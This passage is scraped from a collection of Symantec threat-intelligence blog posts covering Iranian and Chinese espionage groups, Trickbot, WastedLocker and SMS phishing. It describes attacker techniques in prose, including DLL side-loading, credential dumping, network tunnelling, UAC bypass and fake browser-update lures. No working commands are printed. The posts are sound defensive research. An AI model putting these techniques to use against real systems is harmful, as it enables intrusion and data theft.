    "content": "SMS-based outreach has become a standard in the political playbook, with candidates and their supporters soliciting financial support, opinions, and votes through texting with increasing frequency and sophistication. In the course of protecting enterprise endpoints, Symantec, a division of Broadcom (NASDAQ: AVGO), has turned up evidence of an increasingly prevalent scam tactic in the run-up to the U.S. presidential election: SMS phishing attempts using bait with campaign, voting, and political themes. Symantec Endpoint Protection Mobile(SEP Mobile) shields users from SMS phishing attempts by checking URLs found in text messages against the threat intelligence inSymantec WebPulse, part of the Symantec Global Intelligence Network (GIN), and alerting users when the links are suspect. We took a look at the links contained in SMS messages sent to mobile devices located in the United States between the first week in August and late October 2020 and found a sharp increase during that period in the percentage of election-themed messages containing phishing URLs. Over the last three months, we observed the number of election-associated text messages containing links to websites double. Of these messages, we saw the number bringing the user to a scam/phishing/or attack-associated website increase from 1 in 5 (18.3%) to almost half (48.6%). These attacks have been observed in all regions of the United States, and target the full range of the political spectrum. SMS phishing presents a risk to all smartphone users. In addition to relying on protection likeSymantec Endpoint Protection Mobile, it’s a good idea to follow these recommendations: Kevin is a security researcher in Symantec's Modern OS Security (MOS) division. He's constantly researching new and innovative ways to automate discovery of threats impacting mobile users. Shaun is a member of Symantec’s Security Technology and Response team where he is focused on security research, and innovation on mobile platforms. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/sms-phishing-presidential-election"
  },
  {
    "title": "seedworm apt iran middle east",
    "content": "The Iran-linked espionage group Seedworm (aka MuddyWater) has been highly active in recent months, attacking a wide range of targets, including a large number of government organizations in the Middle East. Many of the organizations attacked by Seedworm in recent months have also been targeted by a recently discovered tool called PowGoop (Downloader.Covic), suggesting that it is a tool that Seedworm has incorporated into its arsenal. However, at present Symantec, a division of Broadcom (NASDAQ: AVGO), can only make a medium-confidence link between Seedworm and PowGoop. The recent wave of Seedworm attacks were uncovered by Symantec’s Targeted Attack Cloud Analytics, which leverages advanced machine learning to spot patterns of activity associated with targeted attacks. The activity was reviewed by Symantec’s Threat Hunter team (part ofSymantec’s Endpoint Security Completeoffering) which linked it to previous Seedworm activity. Among the things flagged by Cloud Analytics was a registry key called “SecurityHealthCore\". The code residing in this registry key is executed by PowerShell from a scheduled task. In all of the organizations where this registry key was found, a known Seedworm backdoor (Backdoor.Mori) was subsequently detected. Attacks were uncovered against targets in Iraq, Turkey, Kuwait, the United Arab Emirates, and Georgia. In addition to some government entities, organizations in the telecoms and computer services sector were also targeted. In one such victim, a sample of Backdoor.Mori was dropped and installed as early as December 2019 on a SQL server. Seedworm activity continued until at least July 2020, with the installation of additional hacking tools by the attackers. During this time, Symantec observed Seedworm performing credential-stealing activities as well as setting up tunnels to its own infrastructure to assist with lateral movement using an open-source tools known asSecure Sockets Funneling(SSF) andChisel. Seedworm is known to have leveraged Chisel in the past. Credential dumping was done by dumping the contents of the Windows Registry to files in the same directories as Seedworm backdoors. Additionally, Seedworm was also observed using Quarks password dumper (Quarks PwDump) to steal local account password hashes. Seedworm was also observed setting up tunnels to its own infrastructure using Secure Sockets Funneling and Chisel. These tools allow the attackers to configure local and remote port forwarding as well as copying files to compromised machines. On the same machine where Seedworm was active, a tool known as PowGoop was deployed. This same tool was also deployed against several of the organizations attacked by Seedworm in recent months; however, at present Symantec can only establish a medium-confidence link between PowGoop and Seedworm. PowGoop, which was first publicly reported on in July 2020, is a loader DLL. It likely arrives in a ZIP file named ‘google.zip’ containing the loader itself and legitimate Google binaries used for side-loading it. In the same organization as mentioned previously, Symantec observed Seedworm activity which was followed by PowGoop activity just six days later. In the majority of recent infections, PowGoop appears to have been deployed via a remote execution tool known asRemadmin. This tool is used to execute PowerShell to read and decode the contents of a file which is used to execute the contents in memory. It appears this code is used to load PowGoop’s main DLL (goopdate.dll) via rundll32.exe. A feature of these files is that they have distinctive variable and function naming that resembles human names concatenated together. We have no reason to believe that these are actual people’s names. On several of the victim machines, a ZIP file called ‘google.zip’ was also found present in the same directory. How the ZIP file arrives on the victim’s computer remains unknown. The ZIP contains a mix of legitimate Google executables and malicious DLL files. A legitimate ‘googleupdate.exe’ file is used to side load PowGoop via rundll32.exe. PowGoop loaders are used to decode and execute the contents of a file called ‘config.txt’. All config.txt files found to date contained PowerShell scripts that download and execute more PowerShell code. In some cases, PowGoop is used to launch ‘Wscript.exe’ to execute an unknown VBS file called ‘v.txt’. Similarly, Symantec also observed legitimate tools (openssl.exe) and a downloader tool (ssleay32.dll) present in the same directories used to download additional tools: Similar download requests were also observed via PowerShell: During PowGoop activity, Symantec also observed the attackers using the Secure Sockets Funneling tool as well as Chisel suggesting a link between the two sets of activity. In several recent Seedworm attacks, PowGoop was used on computers that were also infected with known Seedworm malware (Backdoor.Mori). In addition to this, activity involving Seedworm’s Powerstats (aka Powermud) backdoor appears to have been superseded by DLL side-loading of PowGoop. Additionally, during PowGoop activity, we also observed the attackers downloading tools and some unknown content from GitHub repos, similar towhat has been reported on Seedworm‘s Powerstats in the past. These patterns of activity beg the question as to whether PowGoop is actually an evolution of Powerstats rather than a completely new tool. To date, there is insufficient evidence to confirm this hypothesis. However, there are several similarities between the tools: While none of this is sufficient to confirm that PowGoop has evolved from Powerstats, Symantec continues to monitor the activity of Seedworm for any additional evidence. PowGoop has, in recent weeks, been loosely linked to a variant of ransomware known as Thanos. Thanos is an aggressive form of ransomware which, in addition to encryption, will also attempt to overwrite the master boot record (MBR) of the infected computer. Our peers at Palo Alto Networks reportedthat PowGoop was found at a Middle Eastern state-run organization which was also hit by Thanos. This lead to the suspicion that the Thanos attackers were using PowGoop in their attacks; however, Palo Alto could not confirm the connection. Symantec has not found any evidence of a wiper or ransomware on computers infected with PowGoop. This suggests that either the simultaneous presence of PowGoop and Thanos in one attack was a coincidence or, if the two are linked, that PowGoop is not used exclusively to deliver Thanos. Symantec uncovered attacks involving PowGoop against organizations in Iraq, Afghanistan, Israel, Turkey, Azerbaijan, Georgia, Cambodia, and Vietnam. Sectors targeted included governments, technology, telecoms, oil and gas, real estate, and education. Seedworm has been one of the most active Iran-linked groups in recent months, mounting apparent intelligence-gathering operations across the Middle East. While the connection between PowGoop and Seedworm remains tentative, it may suggest some retooling on Seedworm’s part. Any organizations who do find evidence of PowGoop on their networks should exercise extreme caution and perform a thorough investigation. The following protections are in place to protect customers against Seedworm attacks: File-based protection Network-based protection The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/seedworm-apt-iran-middle-east"
  },
  {
    "title": "trickbot botnet ransomware disruption",
    "content": "A global partnership of security, software, telecommunications and financial services firms have struck a blow against the notorious Trickbot botnet by securing a court order directing hosting providers to take down its infrastructure. The order was obtainedin a U.S. lawsuit filed by Microsoftand the Financial Services Information Sharing and Analysis Center (FS-ISAC) against Trickbot’s anonymous operators and was based on technical evidence provided by the Symantec, a division of Broadcom (NASDAQ: AVGO) Threat Hunter Team and others. The legal action marked the culmination of a years-long, cross-industry collaboration to find innovative ways to thwart a pernicious botnet that has fueled numerous cyber-crime sprees. Inwritten testimony provided to the court, Symantec technical director Vikram Thakur said Trickbot has spread prolifically across the internet for years and become one of the most commonly blocked types of malware, suggesting it is now one of the world’s largest botnets. Thakur described the serious harm caused to users whose computers are infected with Trickbot and whose banking credentials and other sensitive information are frequently stolen by the attackers. He also described its impact on financial institutions, which have borne significant losses due to Trickbot fraud. In recent times, Trickbot has been implicated in targeted ransomware attacks, where credentials stolen by the malware were used by the Ryuk ransomware operators to compromise victims’ networks and encrypt all accessible computers. This assessment has beenconfirmed by Europol, which recently noted that “the relationship between Emotet [another botnet], Ryuk and Trickbot is considered one of the most notable in the cybercrime world”. The botnet’s impact on banks and other financial sector organizations prompted a successful and close collaboration between the security industry and the financial sector, represented by FS-ISAC. Unlike prior legal “takedown” actions against botnets, this case did not involve seizure of malicious infrastructure or redirection of network traffic but instead relied upon intellectual-property laws to effectively evict the botnet operators from the command-and-control servers they need to maintain access to victim machines. Trickbot is a major botnet consisting of computers that have been infected with the Trickbot Trojan (Trojan.Trickybot). The Trojan is modular in nature, meaning it can easily be customized with one or more of an array of custom components designed to carry out a range of malicious activities on infected computers. To date, it has mainly been used for two main purposes: stealing credentials from infected computers and acting as a distribution channel for other malware. Symantec believes that Trickbot’s operators earn most of their revenue from selling stolen credentials on the cyber underground and leasing out the botnet as a distribution channel for other malware authors. Trickbot is spread through spam and phishing email campaigns which usually bear a Microsoft Word attachment containing malicious macros. If the document is opened by the unsuspecting user, Trickbot will be installed on the victim’s computer. In some cases, other malware, particularly ransomware, is also installed on the victim’s computer. Trickbot will also attempt to leverage known software vulnerabilities to move across the victim’s network and install itself on other computers. Trickbot is modular malware, capable of performing a range of different malicious activities. The first module to be installed on the victim’s computer is the loader, which contains an encrypted list of IP addresses from which it can download its main module. Once downloaded, the main module will check the architecture of the victim computer and save this along with the bot’s own information. The main component then prepares a framework for additional modules and initiates a connection to one of a pre-configured list of command and control (C&C) servers. The main module downloads one or more additional modules. Known modules include: Trickbot includes a number of features designed to minimize the risk of detection by security software. For example, the main module is designed to evade execution within “sandboxes,” which are controlled environments used by security companies to analyze malware. This module will also check the current user’s privileges and, if they have low privileges, it will elevate them using User Access Control (UAC) bypass, a technique that allows execution of programs with elevated privileges without the user being prompted. When it obtains elevated privileges, Trickbot will attempt to identify any security software that is installed on the computer and attempt to stop it and end any related services. One of the main threats for Trickbot victims is credential theft. This is carried out by a module that monitors for browser visits to a pre-configured list of banking websites. If the user visits any of these websites, the module intercepts and alters network traffic between the computer and the website, allowing the attackers to steal the victim’s banking credentials after they are input by the user. Trickbot will also attempt to steal other credentials from Chrome and Internet Explorer’s password storage features, from various RDP and SSH related services, and from other password managers. While infected computers are added to the Trickbot botnet, they yield the most value to attackers immediately after infection. Other malware families are usually delivered at the point of initial infection. Credential theft happens immediately after infection, while banking credentials are stolen the first time the victim attempts to log into their bank. Even if the malware is subsequently detected and the computer is removed from the botnet, much of the damage will have been done at this point, with stolen credentials exfiltrated by the attackers and likely sold to other cyber criminals. By pooling resources and intelligence and utilizing available legal avenues, the information security and financial sectors hope to strike a major blow against Trickbot. Symantec is grateful for the leadership of Microsoft and FS-ISAC and the support of ESET, NTT, and Lumen Technologies. This latest action, however, is just one step in an ongoing campaign. Complete eradication of this botnet will likely require additional actions from government partners in multiple jurisdictions. However, this action proves that successful private industry collaboration can be effective in countering cyber-crime and we hope that this set a new precedent for further initiatives. The following protections are in place to protect customers against Trickbot activity: Symantec recommends users observe the following best practices to protect against Trickbot attacks: The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/trickbot-botnet-ransomware-disruption"
  },
  {
    "title": "palmerworm blacktech espionage apt",
    "content": "The Threat Hunter Team at Symantec, a division of Broadcom (NASDAQ: AVGO), has uncovered a new espionage campaign carried out by the Palmerworm group (aka BlackTech) involving a brand new suite of custom malware, targeting organizations in Japan, Taiwan, the U.S., and China. The attacks occurred in 2019 and continued into 2020, targeting organizations in the media, construction, engineering, electronics, and finance sectors. We observed the group using previously unseen malware in these attacks. Palmerworm uses a combination of custom malware, dual use tools, and living-off-the-land tactics in this campaign. Palmerworm has been active since at least 2013, with the first activity seen in this campaign in August 2019. Palmerworm was observed using both dual-use tools and custom malware in these attacks. Among the custom malware families we saw it use were: We have not observed the group using these malware families in previous attacks – they may be newly developed tools, or the evolution of older Palmerworm tools. Malware used by Palmerworm in the past has included: While the custom malware used by the group in this campaign is previously undocumented, other elements of the attack bear similarities to past Palmerworm campaigns, making us reasonably confident that it is the same group carrying out this campaign. As well as the four backdoors mentioned, we also see the group using a custom loader and a network reconnaissance tool, which Symantec detects as Trojan Horse and Hacktool. The group also used several dual-use tools, including: All these dual-use tools are commonly exploited by malicious actors like Palmerworm, with advanced persistent threat (APT) groups like this increasingly using living-off-the-land tactics, including the use of dual-use tools, in recent years. These tools provide attackers with a good degree of access to victim systems without the need to create complicated custom malware that can more easily be linked back to a specific group. In this campaign, Palmerworm is also using stolen code-signing certificates to sign its payloads, which makes the payloads appear more legitimate and therefore more difficult for security software to detect. Palmerworm has beenpublicly documentedusing stolen code-signing certificates in previous attack campaigns. We did not see what infection vector Palmerworm used to gain initial access to victim networks in this campaign, however, in the past the group has beendocumented as using spear-phishing emailsto gain access to victim networks. Symantec identified multiple victims in this campaign, in a number of industries, including media, construction, engineering, electronics, and finance. The media, electronics, and finance companies were all based in Taiwan, the engineering company was based in Japan, and the construction company in China. It is evident Palmerworm has a strong interest in companies in this region of East Asia. We also observed Palmerworm activity on some victims in the U.S., however, we were unable to identify the sector of the companies targeted. Palmerworm activity was first spotted in this campaign in August 2019, when activity was seen on the network of a Taiwanese media company and a construction company in China. The group remained active on the network of the media company for a year, with activity on some machines there seen as recently as August 2020. Palmerworm also maintained a presence on the networks of a construction and a finance company for several months. However, it spent only a couple of days on the network of a Japanese engineering company in September 2019, and a couple of weeks on the network of an electronics company in March 2020. It spent approximately six months on one of the U.S.-based machines on which we observed activity. The finance, media, and construction industries, then, appear to be of the biggest interest to Palmerworm in this campaign. There have been reports previously of Palmerwormtargeting the media sector. While we cannot see what Palmerworm is exfiltrating from these victims, the group is considered an espionage group and its likely motivation is considered to be stealing information from targeted companies. While the custom malware used in this attack is not malware we have seen used by Palmerworm before, some of the samples identified in this research are detected by other vendors as PLEAD, which is a known Palmerworm (aka Blacktech) malware family. We also saw the use of infrastructure that has previously been attributed to Palmerworm. The group’s use of dual-use tools has also been seen in previous campaigns identified as being carried out by Palmerworm, while the location of its victims is also typical of the geography targeted by Palmerworm in past campaigns. The group’s use of stolen code-signing certificates has also been observed in previous Palmerworm attacks. These various factors make us reasonably confident we can attribute this activity to Palmerworm. Symantec does not attribute Palmerworm’s activity to any specific geography, however,Taiwanese officials have stated publiclythat they believe Blacktech, which we track as Palmerworm, is backed by the Chinese government. APT groups continue to be highly active in 2020, with their use of dual-use tools and living-off-the-land tactics making their activity ever harder to detect, and underlining the need for customers to have a comprehensive security solution in place that can detect this kind of activity. The following protections are in place to protect customers against Palmerworm activity: The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/palmerworm-blacktech-espionage-apt"
  },
  {
    "title": "elfin indictments iran espionage",
    "content": "UPDATE September 22:We have made some edits to this blog. An earlier version inaccurately described the links to the Elfin group as \"strong\". The U.S. government hasindicted three Iranian nationals on charges related to cyber attacks against aerospace and satellite technology companies. Said Pourkarim Arabi, Mohammad Reza Espargham, and Mohammad Bayati are alleged to have carried out a string of attacks between 2015 and 2019 which resulted in the theft of sensitive commercial information, intellectual property, and personal data from targeted organizations. According to the indictment, Arabi is a member of Iran’s Islamic Revolutionary Guard Corps (IRGC) and carried out the attacks with Espargham and Bayati on behalf of the IRGC. Espargham is alleged to be the leader of an Iranian hacking group known as the Iranian Dark Coders Team, while Bayati is alleged to be a malware developer who shared tools with Arabi and Espargham. The men are said to have obtained the names of individuals working in the aerospace and satellite industry, created fake accounts in their names, and used them to send spear-phishing emails to targeted organizations. If victims clicked on a malicious link within the email, malware would be installed on their computers. Once on the victim’s network, the attackers would escalate privileges, steal credentials, move laterally across the network, and deploy further malware on computers before exfiltrating data. Although not referenced specifically in the indictment, the attacks appear to have some links to the Elfin (aka APT33) cyber espionage group. Aside from the fact that the targets and tactics described in the indictment closely resemble Elfin activity observed by Symantec, there is also a commonality in tools used. According to the indictment, one of the main malware tools used in the attacks was the Nanocore RAT (Trojan.Nancrat). Although it was publicly available, Symantec has observed Elfin make extensive use of Nanocore. While we haven’t observed any other Iranian group utilizing this tool, other vendors have found cases. Symantec has been tracking Elfin since late 2015. Aside from compromising its victims with spear-phishing emails, the group is also known for scanning for vulnerable websites, either for potential victims or for use as command and control (C&C) infrastructure. To date it has compromised a wide range of targets, including governments along with organizations in the research, chemical, engineering, manufacturing, consulting, finance, telecoms, and several other sectors. Aside from the U.S, Elfin is also heavily focused on targets in Saudi Arabia, which accounted for 42 percent of attacks observed by Symantec between the start of 2016 and March 2019. During this time, Symantec also identifiedpossible links to the destructive Shamoon group. Symantec has observed multiple Elfin campaigns over the past 18 months. In February 2019, the group attempted to exploit a known vulnerability (CVE-2018-20250) in WinRAR in order to compromise an organization in the chemical sector in Saudi Arabia. In June 2019, Elfin sent out a phishing email to hundreds of recipients across multiple countries in what appeared to be an opportunistic trawling attack. The link within the document led recipients to dynamic DNS infrastructure controlled by the group. Subsequently, in late August 2019, Elfin compromised a victim in Saudi Arabia with a malicious HTA file. Following the initial compromise, Elfin continued to rely on the group’s known tools, tactics, and procedures (TTPs) to strengthen its foothold. During the incident, the legitimate utility mshta.exe executed a malicious HTA file with a job application theme. The file was downloaded after a victim used Microsoft Edge to visit a malicious website. A PowerShell command then downloaded a JPG file from a dynamic DNS host spoofing a U.S. defense contractor. In a separate announcement, the FBI hasalso issued a new cyber security advisory about an Iranian company called Rana Intelligence Computing Company, which it says is a front for the Chafer (aka APT39) cyber espionage group, which is linked to the Iranian Ministry of Intelligence and Security (MOIS). The FBI said Rana had systematically targeted and monitored Iranian citizens, dissidents, and journalists, along with government networks of Iran’s neighboring countries, and foreign organizations in the travel, academic, and telecommunications sectors. Simultaneously, the U.S. Treasury Department’s Office of Foreign Assets Control (OFAC)imposed sanctions on Rana, Chafer, and a number of named individuals who work for MOIS. Chafer has been active since at least July 2014 and its activitieswere first exposed by Symantec in December 2015, when it was found to be conducting targeted surveillance of domestic and international targets. In 2018 Symantecobserved it mounting a number of ambitious new attacksincluding the compromise of a major telecoms services provider in the Middle East. State-sponsored espionage actors appear to be firmly in the sights of the U.S. Justice and Treasury Departments. These indictments and sanctions may generate an unwelcome amount of publicity and disruption for groups that may have believed they were operating with a degree of anonymity. Symantec has the following protection in place to protect customers against Elfin attacks: File-based protection Symantec has the following protection in place to protect customers against Chafer attacks: File-based protection IPS: network-based protection The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/elfin-indictments-iran-espionage"
  },
  {
    "title": "apt41 indictments china espionage",
    "content": "The U.S. governmenthas charged seven men in relation to hundreds of cyber attacks against organizations in the U.S. and multiple other countries in Asia and Europe. Two of the men, who were based in Malaysia, were arrested and their extradition to the U.S. has been requested. The other five are based in China and remain at large. The attacks were attributed to a China-linked organization dubbed APT41 and involved a combination of intellectual property theft and financially motivated cyber crime. While some of our peers monitor APT41 as a single operation, Symantec regards it as two distinct actors: Grayfly and Blackfly. Grayfly has been particularly active in recent years, mounting high volume espionage attacks against organizations spread across Asia, Europe, and North America. They are interested in a wide range of sectors, including food, financial, healthcare, hospitality, manufacturing, telecoms, and government. It is known for using the Barlaiy/POISONPLUG and Crosswalk/ProxIP (Backdoor.Motnug) malware families in its attacks. Victims are frequently compromised by exploiting public facing web servers. In recent attacks, Symantec has seen Grayfly deploy Backdoor.Motnug against targeted organizations in conjunction with publicly available Cobalt Strike malware. Backdoor.Motnug provides the attackers with comprehensive remote access to the network and creates proxy connections allowing access to hard-to-reach segments of a target network. In one attack against a telecoms provider, Grayfly was seen using an internal tool capable of interacting with an SMS database, demonstrating that intelligence gathering was the motive of the attack. Prosecutors in the U.S. have charged three Chinese men– Jiang Lizhi, Qian Chuan, and Fu Qiang – with involvement in attacks that involve Grayfly tools and tactics. The trio are based in the Chinese city of Chengdu and all hold senior positions in a company called Chengdu 404. The company describes itself as a network security specialist and claims to employ a team of white hat hackers who can perform penetration testing along with “offensive” and “defensive” security operations. The indictment alleges that the three men were also involved in attacks against over 100 different organizations in the U.S., South Korea, Japan, India, Taiwan, Hong Kong, Malaysia, Vietnam, India, Pakistan, Australia, the United Kingdom, Chile, Indonesia, Singapore, and Thailand. Jiang was said to have a “working relationship” with the Chinese Ministry of State Security which would provide him and his associates with a degree of state protection. Blackfly has been active since at least 2010 and is known for attacks involving the PlugX/Fast (Backdoor.Korplug), Winnti/Pasteboy (Backdoor.Winnti), and Shadowpad (Backdoor.Shadowpad) malware families. The group is best known for its attacks on the computer gaming industry. However, Symantec has also observed attacks on the semiconductor, telecoms, materials manufacturing, pharmaceutical, media and advertising, hospitality, natural resources, fintech, and food sectors. Recent Blackfly activity observed by Symantec saw the group deploy a slightly modified version of the Winnti malware against a telecoms organization in Taiwan. A feature of the attack was their use of the names of security vendors in naming files in an attempt to avoid raising suspicions. A dropper was signed with an invalid certificate with the subject \"McAfee, Inc.\"  The dropper then delivered several DLLs with file names that referenced Symantec software. The attackers had not compromised Symantec software, and were not leveraging it in the attack. In a separate indictment, prosecutors allege that two Malaysian nationals – Wong Ong Hua and Ling Yang Ching –were involved in attacks that involved Blackfly tools and tactics. Wong is the founder and CEO of a company called Sea Gamer Mall, while Ling is its chief product officer and a shareholder. The duo are alleged to have collaborated with other attackers to mount a string of attacks against computer game companies in order to obtain in-game digital items, such as currencies, and then selling them for profit. While Grayfly and Blackfly appear to be distinct operations, the indictments allege that there is a link between the two groups. Two Chinese men – Zhang Haoran and Tan Dailin –are charged in a third indictment with collaborating with both groups. The two men are reported to have worked for a time at Chengdu 404, the company that prosecutors identify as linked to Grayfly attacks. However, they are also alleged to have collaborated with the charged Blackfly actors in order to make additional money by mounting attacks on computer gaming companies. The indictment alleges that in several instances, they used their unauthorized access to gaming company networks to kick other attackers off the network, effectively eliminating their competition. Grayfly and Blackfly have been prolific attackers in recent years and, while it remains to be seen what impact the charges will have on their operations, the publicity surrounding the indictments will certainly be unwelcome among attackers who wish to maintain a low profile. Symantec remains committed to tracking the activity of these groups in order to protect our customers from their attacks. Symantec products protect against threats discussed in this blog with the following detections: The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/apt41-indictments-china-espionage"
  },
  {
    "title": "threat landscape trends q2 2020",
    "content": "As the first half of the year drew to a close, we took a look through telemetry from our vast range of data sources and selected some of the trends that stood out from April, May, and June 2020. From a resurgence in cryptojacking activity to the return of a major malware distribution platform, let’s take a quick look at the trends that shaped the cyber security threat landscape in the second quarter of 2020. After a sharp decline in cryptojacking following the shutdown of browser-based mining script maker CoinHive in March 2019, the second quarter of 2020 saw a resurgence in activity. Browser-based cryptojacking events blocked by Symantec saw a 163 percent increase in Q2 2020 compared to the previous quarter. This spike in activity coincides with an increase in the value of cryptocurrencies, including Bitcoin and Monero, which are two currencies often mined by browser-based coinminers. For more information on cryptojacking, read our blog: Cryptojacking: A Modern Cash Cow As countries around the world began easing COVID-19 lockdown restrictions, malware distributors also resumed working at full capacity. May and June saw a significant increase in the number of malware attacks blocked by Symantec, a division of Broadcom (NASDAQ: AVGO). In total, Symantec blocked over 60 million infection attempts in the second quarter of 2020, which represents a 74.6 percent increase over the previous quarter. For over a year, the Emotet botnet (Trojan.Emotet) has been subdued, with two long periods of inactivity: Between May and September 2019 and again between February and July 2020. This drop-off in activity is reflected in Symantec’s detections of new Emotet infections during this period. However, while activity for Q2 remained nominal, the botnet ramped up its activity in early Q3. Emotet's return is a source of concern, since it is a major malware distribution platform. For more information on Emotet, read our blog: The Evolution of Emotet: From Banking Trojan to Threat Distributor There was an increase in attacks using the targeted Sodinokibi ransomware (Ransom.Sodinokibi), also known as REvil, in the second quarter of 2020. Following a lull in March, activity began to increase again in April. By the end of Q2, Sodinokibi activity was up by over 630 percent, compared to the end of Q1. This ties in with research from Symantec in June which revealed a Sodinokibi campaign in which the attackers were using the Cobalt Strike commodity malware to deliver Sodinokibi to victims in the healthcare, services, and food sectors. For additional information on Sodinokibi, read our blog: Sodinokibi: Ransomware Attackers also Scanning for PoS Software, Leveraging Cobalt Strike A growing number of attacks in recent months have involved the use of Cobalt Strike (Backdoor.Cobalt), a multipurpose commodity malware available for purchase, most notably used in the WastedLocker (Ransom.WastedLocker) targeted ransomware attacks. Reflecting this trend, detections of intrusions involving confirmed Cobalt Strike usage are up significantly in the past two quarters. In many cases, Cobalt Strike is blocked by other detection technologies and signatures, meaning the true number of attacks involving this malware may be significantly higher. For more information on WastedLocker and its use of Cobalt Strike, read our blog: WastedLocker: Symantec Identifies Wave of Attacks Against U.S. Organizations The Lokibot information-stealing malware (Infostealer.Lokibot) saw a spike in activity in June, with blocked attacks increasing by almost 800 percent over the previous month. If this increased activity continues, Q3 could see Lokibot match or surpass activity seen in Q1. Lokibot, one of today’s most prevalent information-stealing threats, is often distributed via spam campaigns. Symantec recently began monitoring two new spam campaigns spreading Lokibot and targeting medium and large businesses around the world. One campaign involves the impersonation of a Saudi company specializing in industrial services and another impersonates a large shipping firm. The number of attacks against Symantec Internet of Things (IoT) honeypots* per day was down 12 percent in Q2 compared to Q1 2020. However, Q2 2020 still saw a greater number of attacks (14 percent more) compared to Q4 2019. While the numbers may be down, the risk of attack against internet-connected devices still remains high, as highlighted by a recent alert jointly released by the U.S. Cybersecurity and Infrastructure Security Agency (CISA) and the UK’s National Cyber Security Centre (NCSC) warning QNAP NAS device owners to update their devices in case QSnatch malware attacks restart. The number of unique IP addresses performing IoT attacks also fell in Q2, down 19 percent over the previous quarter. *Symantec’s IoT honeypots emulate protocols used by virtually all IoT devices, such as routers, connected cameras, digital video recorders, and so on. The top ten user names and passwords used in attacks on IoT devices. Most of the credentials used by attackers are default or easily guessable. The largest amount of attacks originated from IP addresses located in the U.S. followed by China, Taiwan, Brazil, and Russia. Since attacks are carried out by botnets of infected IoT devices, these regions have the highest number of infected IoT devices. For the latest insights on threat intelligence visitSymantec Enterprise Blog/Threat Intelligence. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/threat-landscape-trends-q2-2020"
  },
  {
    "title": "wastedlocker ransomware us",
    "content": "UPDATE June 30:Further investigation by Symantec has confirmed dozens of U.S. newspaper websites owned by the same parent company have been compromised by SocGholish injected code. Some of the organizations targeted by WastedLocker could have been compromised when an employee browsed the news on one of its websites. Symantec has notified the company and it has now removed the malicious code. Symantec, a division of Broadcom (NASDAQ: AVGO), has identified and alerted our customers to a string of attacks against U.S. companies by attackers attempting to deploy the WastedLocker ransomware (Ransom.WastedLocker) on their networks. The end goal of these attacks is to cripple the victim’s IT infrastructure by encrypting most of their computers and servers in order to demand a multimillion dollar ransom. At least 31 customer organizations have been attacked, meaning the total number of attacks may be much higher. The attackers had breached the networks of targeted organizations and were in the process of laying the groundwork for staging ransomware attacks. WastedLocker is a relatively new breed of targeted ransomware,documented just prior to our publication by NCC Group, while Symantec was performing outreach to affected networks. WastedLocker has been attributed to the notorious “Evil Corp” cyber crime outfit. Evil Corp has previously been associated with theDridex banking Trojanand BitPaymer ransomware, which are believed to have earned their creators tens of millions of dollars. Two Russian men who are alleged to be involved in the grouphave open indictments against them in the U.S. The attacks begin with a malicious JavaScript-based framework known as SocGholish, tracked to more than 150 compromised websites, which masquerades as a software update. Once the attackers gain access to the victim’s network, they use Cobalt Strike commodity malware in tandem with a number of living-off-the-land tools to steal credentials, escalate privileges, and move across the network in order to deploy the WastedLocker ransomware on multiple computers. The attacks were proactively detected on a number of customer networks by Symantec’s Targeted Attack Cloud Analytics, which leverages advanced machine learning to spot patterns of activity associated with targeted attacks. The activity was reviewed by Symantec’s Threat Hunter team (part ofSymantec’s Endpoint Security Completeoffering) who verified it and quickly realized it corresponded closely to publicly documented activity seen in the early stages of WastedLocker attacks. This discovery enabled us to identify further organizations that had been targeted by WastedLocker and identify additional tools, tactics, and procedures used by the attackers, helping us to strengthen our protection against every stage of the attack. Symantec has uncovered attacks against 31 organizations to date, all of which were located in the U.S. The vast majority of targets are major corporations, including many household names. Aside from a number of large private companies, there were 11 listed companies, eight of which are Fortune 500 companies. All but one of the targeted organizations are U.S. owned, with the exception being a U.S.-based subsidiary of an overseas multinational. Organizations in a diverse range of sectors were attacked. Manufacturing was the sector most affected, accounting for five targeted organizations. This was followed by Information Technology (four) and Media and Telecommunications (three). Had the attackers not been disrupted, successful attacks could have led to millions in damages, downtime, and a possible domino effect on supply chains. The initial compromise of an organization involves the SocGholish framework, which is delivered to the victim in a zipped file via compromised legitimate websites. Symantec has discovered at least 150 different legitimate websites that refer traffic to websites hosting the SocGholish zip file. It is possible that these websites lead to different malware, as such redirection services can be utilized by multiple actors at the same time. The zipped file contains malicious JavaScript, masquerading as a browser update. A second JavaScript file is then executed by wscript.exe. This JavaScript first profiles the computer using commands such as whoami, net user, and net group, then uses PowerShell to download additional discovery related PowerShell scripts. The next stage of the attack is to deploy Cobalt Strike. PowerShell is used to download and execute a loader from a domain publicly reported as being used to deliver Cobalt Strike as part of WastedLocker attacks. The loader also shared a command and control (C&C) domain with this reported Cobalt Strike infrastructure. The loader contained a .NET injector, also reportedly seen in WastedLocker attacks. The injector, along with the loader for Cobalt Strike Beacon, is reportedly taken from an open-source project called Donut, which is designed to help inject and execute in-memory payloads. The injected payload is known as Cobalt Strike Beacon and can be used to execute commands, inject other processes, elevate current processes or impersonate other processes, and upload and download files. The Get-NetComputer command fromPowerViewis renamed by the attackers to a random name. This command was then seen searching for all the computer objects in the Active Directory database with filter condition like *server* or *2003* or *7* 